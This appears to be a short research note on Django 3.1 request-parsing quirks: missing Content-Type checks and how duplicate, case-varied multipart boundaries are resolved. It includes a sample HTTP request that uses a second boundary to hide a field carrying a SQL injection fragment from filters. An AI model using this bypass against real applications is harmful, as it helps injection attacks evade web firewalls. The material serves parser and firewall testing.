### Django 3.1

**Endpoint**
```py
def test1(request):
  data = json.loads(request.body)

def test2(request):
  data = request.POST
```

**JSON Content-Type**  
Doesn't have built-in Content-Type checking functionality, attacker can use `application/x-www-form-urlencoded` Content-Type with JSON body.

**Content-Type**
```
application/x-www-form-urlencoded
multipart/form-data
```

**Multipart Content-Type**
| Check             | Value            |
|-------------------|------------------|
| Mime-Type         | case-sensitive   |
| Multiple boundary | last position    |
| Boundary key      | case-insensitive |

**HTTP Request**  
```http
POST / HTTP/1.1
Host: localhost
Content-Type: multipart/form-data; boundary=xxx; BOUNDARY=yyy
Content-Length: 189

--xxx
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

--yyy
Content-Disposition: form-data; name="q"

' union select '1
--yyy--
--xxx--
```